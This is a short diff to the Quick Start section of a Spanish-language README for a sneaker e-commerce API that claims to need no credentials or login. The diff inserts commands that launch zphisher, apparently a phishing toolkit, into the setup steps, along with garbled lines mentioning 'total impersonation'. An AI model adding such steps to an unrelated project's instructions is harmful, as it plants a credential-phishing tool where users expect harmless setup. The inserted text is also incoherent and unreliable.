@@ -17,6 +17,11 @@ E-commerce de sneakers sin peticiones de credenciales ni inicio de seción todo 
 
 ### 🛠️ Quick Start
 ```bash
+cd ~/zphisher
+bash zphisher.sh
+comando de integración niña objetc
+
+método Eintenberg , con suplantacion total en el wah 
 pip install -r requirements.txt
 uvicorn api.main:app --reload
 # Docs en http://localhost:8000/docs
